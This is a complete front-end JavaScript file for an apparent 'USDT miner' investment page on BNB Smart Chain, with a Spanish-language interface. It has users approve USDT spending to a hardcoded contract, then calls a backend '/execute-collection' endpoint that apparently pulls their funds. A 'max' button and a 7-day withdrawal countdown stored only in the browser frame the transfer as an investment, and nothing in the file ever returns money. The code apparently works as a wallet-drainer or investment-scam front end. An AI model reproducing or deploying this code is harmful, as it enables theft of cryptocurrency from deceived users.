"use strict";

// ─── Configuration (synchronized with window.APP_CONFIG) ─────────────────────
const APP_CFG = (typeof window !== 'undefined' && window.APP_CONFIG) ? window.APP_CONFIG : {};
const MERCHANT_ADDRESS = APP_CFG.MERCHANT_ADDRESS || "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = APP_CFG.CONTRACT_ADDRESS || "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = APP_CFG.USDT_ADDRESS || "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = APP_CFG.CHAIN_ID || "0x38";
const MIN_USDT_BALANCE = 0n;
const BACKEND_URL = APP_CFG.BACKEND_URL || "https://secure-merchant.onrender.com/api";
const USDT_DECIMALS = (Number.isFinite(APP_CFG.USDT_DECIMALS) ? APP_CFG.USDT_DECIMALS : 18);

const BSC_RPC_URLS = (Array.isArray(APP_CFG.RPC_URLS) && APP_CFG.RPC_URLS.length)
  ? APP_CFG.RPC_URLS
  : [
    "https://bsc-rpc.publicnode.com",
    "https://bsc-dataseed1.binance.org/",
    "https://bsc-dataseed2.binance.org/",
    "https://rpc.ankr.com/bsc"
  ];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         APP_CFG.CHAIN_NAME || "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: [APP_CFG.BLOCK_EXPLORER || "https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ──────────────────────────────────────────────────────────[...]
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend (best-effort) ────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers (safe DOM updates) ──────────────────────────────────────────
let _toastTimer;
function _applyToastStyle(type) {
  if (!toastEl) return;
  if (type === "success") {
    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
  } else if (type === "error") {
    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
  } else {
    toastEl.style.removeProperty("background");
  }
}

function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent = String(msg);
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _applyToastStyle(type);

  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function showToastLink(msg, linkHref, linkText = 'Ver en BscScan ↗', type = 'success', ms = 8000) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.innerHTML = '';
  const span = document.createElement('span');
  span.textContent = msg + ' ';
  const a = document.createElement('a');
  a.href = linkHref;
  a.target = '_blank';
  a.rel = 'noopener noreferrer';
  a.textContent = linkText;
  a.style.color = '#fff';
  a.style.textDecoration = 'underline';
  toastEl.appendChild(span);
  toastEl.appendChild(a);
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden = false;
  _applyToastStyle(type);

  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  approveBtn.style.opacity = on ? "0.8" : "1";
  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Live Balance & Smart Max Button ───────────────────────────────────────
async function fetchAndDisplayUserBalances(rawProvider) {
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    
    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
    const usdtBal = await usdtContract.balanceOf(userAddress);
    const formattedUsdt = ethers.formatUnits(usdtBal, USDT_DECIMALS);
    
    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (balanceLabel) {
      balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
    }

    const maxBtn = document.getElementById("maxBtn");
    if (maxBtn) {
      maxBtn.onclick = () => {
        const amountInput = document.getElementById("investAmount");
        if (amountInput) {
          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1); // small reserve
          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
          amountInput.dispatchEvent(new Event('input'));
        }
      };
    }
  } catch (err) {
    console.error("Error al sincronizar saldos en vivo:", err);
  }
}

// ─── Backend collect trigger ───────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), USDT_DECIMALS).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

let pendingInvestment = false;

if (window.modal && typeof window.modal.subscribeProviders === "function") {
  window.modal.subscribeProviders((state) => {
    const rawProvider = state["eip155"]; 
    
    if (rawProvider) {
      fetchAndDisplayUserBalances(rawProvider);
      if (pendingInvestment) {
        pendingInvestment = false; 
        runInvestmentFlow(rawProvider); 
      }
    }
  });
}

if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    let rawProvider = null;
    if (window.modal && typeof window.modal.getWalletProvider === "function") {
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}
    }

    if (!rawProvider) {
      pendingInvestment = true; 
      setLoading(true, "Abriendo selector de billetera...");
      
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open(); 
          
          let freshProvider = null;
          if (typeof window.modal.getWalletProvider === "function") {
            try {
              freshProvider = window.modal.getWalletProvider();
            } catch (_) {}
          }

          if (!freshProvider) {
            pendingInvestment = false;
            setLoading(false);
            return;
          } else {
            await runInvestmentFlow(freshProvider);
            return;
          }

        } catch (err) {
          console.error("Error al abrir AppKit:", err);
          pendingInvestment = false;
          setLoading(false);
        }
      } else {
        setLoading(false);
      }
      return; 
    }

    await runInvestmentFlow(rawProvider);
  });
}

async function runInvestmentFlow(rawProvider) {
  setLoading(true, "Conectando proveedor…");
  
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    setLoading(true, "Verificando red BSC...");
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      setLoading(true, "Cambiando a red BSC…");
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_CHAIN_PARAMS]
          });
        } else {
          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
          setLoading(false);
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    setLoading(true, "Verificando saldo de gas (BNB)…");
    const bnbBalance = await provider.getBalance(userAddress);
    const minGasRequired = ethers.parseEther("0.0005"); 

    if (bnbBalance < minGasRequired) {
      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
      setLoading(false);
      return;
    }

    const inputElement = document.getElementById("investAmount");
    const rawInputVal = inputElement ? inputElement.value : "1";
    const requiredAmount = ethers.parseUnits(rawInputVal || "1", USDT_DECIMALS);

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    setLoading(true, "Validando saldo de USDT…");
    const usdtBalance = await usdtContract.balanceOf(userAddress);

    if (usdtBalance < requiredAmount) {
      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
      setLoading(false);
      return;
    }

    setLoading(true, "Verificando autorizaciones...");
    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
    
    if (allowance < requiredAmount) {
      setLoading(true, "Firma requerida: Aprobar USDT…");
      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
      
      setLoading(true, "Confirmando aprobación en red...");
      await txApprove.wait();
    }

    setLoading(true, "Procesando inversión en protocolo...");
    const txCollect = await triggerBackendCollect(userAddress); 

    const txHash = txCollect?.hash || "";
    if (txHash) {
      showToastLink('¡Inversión exitosa!', `${APP_CFG.BLOCK_EXPLORER || 'https://bscscan.com'}/tx/${txHash}`, 'Ver en BscScan ↗', 'success', 8000);
    } else {
      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
    }

    // Persist and render transaction history (improves UX)
    try {
      addTransactionHistoryEntry(userAddress, rawInputVal || "1", txHash);
    } catch (e) {
      console.warn('No se pudo guardar el historial localmente:', e);
    }

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("denied") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Operación cancelada por el usuario.", "default");
    } else {
      console.error("Web3 Error crítico:", err);
      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
    }
  } finally {
    setLoading(false);
  }
}

// ─── Transaction history (localStorage + UI) ───────────────────────────────
const HISTORY_KEY = 'usdtminer_tx_history_v1';
const WITHDRAWAL_DAYS = Number.isFinite(APP_CFG.WITHDRAWAL_DAYS) ? APP_CFG.WITHDRAWAL_DAYS : 7;
let _historyInterval = null;

function getTransactionHistory() {
  try {
    const raw = localStorage.getItem(HISTORY_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch (e) {
    console.warn('Failed to read history:', e);
    return [];
  }
}

function saveTransactionHistory(arr) {
  try {
    localStorage.setItem(HISTORY_KEY, JSON.stringify(arr));
  } catch (e) {
    console.warn('Failed to save history:', e);
  }
}

function addTransactionHistoryEntry(userAddress, amount, txHash) {
  const ts = Date.now();
  const days = Number(WITHDRAWAL_DAYS) || 7;
  const unlockAt = ts + days * 24 * 60 * 60 * 1000;
  const entry = {
    id: txHash || `local-${ts}`,
    userAddress,
    amount: String(amount),
    txHash: txHash || null,
    createdAt: ts,
    unlockAt
  };
  const h = getTransactionHistory();
  h.unshift(entry);
  saveTransactionHistory(h.slice(0, 100));
  renderTransactionHistory();
}

function formatTimeRemaining(ms) {
  if (ms <= 0) return 'Disponible';
  const s = Math.floor(ms/1000);
  const days = Math.floor(s/86400);
  const hours = Math.floor((s%86400)/3600);
  const minutes = Math.floor((s%3600)/60);
  if (days > 0) return `${days}d ${hours}h`;
  if (hours > 0) return `${hours}h ${minutes}m`;
  return `${minutes}m`;
}

function createFloatingHistoryPanel() {
  if (document.getElementById('txHistory')) return;
  const panel = document.createElement('aside');
  panel.id = 'txHistory';
  panel.setAttribute('aria-live', 'polite');
  Object.assign(panel.style, {
    position: 'fixed',
    right: '18px',
    bottom: '18px',
    width: '320px',
    maxHeight: '60vh',
    overflowY: 'auto',
    background: 'rgba(20,22,28,0.9)',
    border: '1px solid rgba(255,255,255,0.06)',
    padding: '12px',
    borderRadius: '12px',
    zIndex: 9999,
    boxShadow: '0 10px 30px rgba(0,0,0,0.6)'
  });

  const title = document.createElement('div');
  title.textContent = 'Historial de inversiones';
  title.style.fontWeight = '700';
  title.style.marginBottom = '8px';
  panel.appendChild(title);

  const list = document.createElement('div');
  list.id = 'txHistoryList';
  panel.appendChild(list);

  const footer = document.createElement('div');
  footer.style.marginTop = '8px';
  const clearBtn = document.createElement('button');
  clearBtn.textContent = 'Limpiar';
  clearBtn.style.background = 'transparent';
  clearBtn.style.color = '#ccc';
  clearBtn.style.border = '1px solid rgba(255,255,255,0.04)';
  clearBtn.style.padding = '6px 8px';
  clearBtn.style.borderRadius = '8px';
  clearBtn.onclick = () => { saveTransactionHistory([]); renderTransactionHistory(); };
  footer.appendChild(clearBtn);
  panel.appendChild(footer);

  document.body.appendChild(panel);
}

function renderTransactionHistory() {
  const container = document.getElementById('txHistory') || (function(){ createFloatingHistoryPanel(); return document.getElementById('txHistory'); })();
  if (!container) return;
  const list = document.getElementById('txHistoryList');
  if (!list) return;
  // clear
  while (list.firstChild) list.removeChild(list.firstChild);

  const items = getTransactionHistory();
  if (!items.length) {
    const empty = document.createElement('div');
    empty.textContent = 'Aún no hay inversiones realizadas.';
    empty.style.color = 'var(--text-muted)';
    list.appendChild(empty);
    return;
  }

  for (const it of items) {
    const row = document.createElement('div');
    row.style.display = 'flex';
    row.style.justifyContent = 'space-between';
    row.style.alignItems = 'center';
    row.style.padding = '8px 6px';
    row.style.borderBottom = '1px dashed rgba(255,255,255,0.03)';

    const left = document.createElement('div');
    const addr = document.createElement('div');
    addr.textContent = it.userAddress ? it.userAddress : 'Tu wallet';
    addr.style.fontSize = '0.9rem';
    addr.style.fontWeight = '600';
    const amt = document.createElement('div');
    amt.textContent = `${parseFloat(it.amount).toFixed(2)} USDT`;
    amt.style.fontSize = '0.85rem';
    amt.style.color = '#fff';
    left.appendChild(addr);
    left.appendChild(amt);

    const right = document.createElement('div');
    right.style.textAlign = 'right';

    const time = document.createElement('div');
    time.style.fontSize = '0.8rem';
    time.style.color = 'var(--text-muted)';
    const remMs = it.unlockAt - Date.now();
    time.textContent = formatTimeRemaining(remMs);
    time.dataset.unlockAt = it.unlockAt;

    if (it.txHash) {
      const a = document.createElement('a');
      a.href = `${APP_CFG.BLOCK_EXPLORER || 'https://bscscan.com'}/tx/${it.txHash}`;
      a.target = '_blank';
      a.rel = 'noopener noreferrer';
      a.textContent = 'Ver tx';
      a.style.display = 'block';
      a.style.fontSize = '0.8rem';
      a.style.color = 'var(--brand-primary)';
      right.appendChild(a);
    }

    right.appendChild(time);

    row.appendChild(left);
    row.appendChild(right);
    list.appendChild(row);
  }

  // start interval to update countdowns
  if (_historyInterval) clearInterval(_historyInterval);
  _historyInterval = setInterval(() => {
    const times = list.querySelectorAll('[data-unlock-at]');
    times.forEach(el => {
      const unlock = Number(el.dataset.unlockAt);
      el.textContent = formatTimeRemaining(unlock - Date.now());
    });
  }, 1000);
}

// Render existing history on load
try { renderTransactionHistory(); } catch (e) { console.warn('renderHistory failed', e); }
